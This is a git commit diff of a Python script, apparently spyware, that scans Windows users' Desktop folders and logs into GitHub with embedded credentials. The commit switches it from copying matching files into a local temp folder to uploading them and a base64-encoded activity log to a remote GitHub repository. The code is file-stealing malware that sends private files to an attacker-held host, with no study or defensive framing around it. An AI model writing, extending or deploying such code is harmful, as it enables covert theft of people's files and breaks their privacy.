5fb126bab787e74cd5ece600cfd2c90783671a97
doctor305 <94644276@qq.com>
2017-06-05 11:24:05 +0800

    update

--- searchdesktop.py
+++ searchdesktop.py
@@ -3,14 +3,10 @@ import os.path as path
 from github3 import login
 import base64
 import random
-##import get_screenshot
 
-
-
-##get_screenshot.get_screenshot()
 def connect_to_github():  
-    gh=login(username="<username>",password="<password>")  
-    repo=gh.repository("<username>","<repository>")  
+    gh=login(username="doctor305",password="<password>")  
+    repo=gh.repository("doctor305","test")  
     branch=repo.branch("master")  
     return gh,repo,branch
   
@@ -45,17 +41,20 @@ def searchdesktop(log_name):
                         print "Send this file! "
                         f.write("Send this file! \n")
                         full_file_name = 'C:\\Users'+os.sep+user+os.sep+'Desktop'+os.sep+filename
-                        with open(full_file_name,'rb') as f_temp:
-                            if not path.exists('temp'):
-                                os.mkdir('temp')
-                            with open('temp'+os.sep+str(random.randint(100,999))+filename,'wb') as f_save_file:
-                                f_save_file.write(f_temp.read())
-                                #store_data(f_temp,remote_path)
+                        try:
+                            with open(full_file_name,'rb') as f_temp:
+##                                if not path.exists('temp'):
+##                                    os.mkdir('temp')
+##                                with open('temp'+os.sep+str(random.randint(100,999))+filename,'wb') as f_save_file:
+##                                    f_save_file.write(f_temp.read())
+                                store_data(f_temp.read(),'file/'+filename)
+                        except:
+                            f.write('This file is being used. ')
                 
             f.write('End\n')
     f.close()
-##    with open(log_name,'r') as senddate:
-##        store_data_b64(senddate,remote_path)
+    with open(log_name,'r') as senddate:
+        store_data_b64(senddate.read(),'log/log.txt')
 
 if __name__ == '__main__':
     searchdesktop('log.txt')
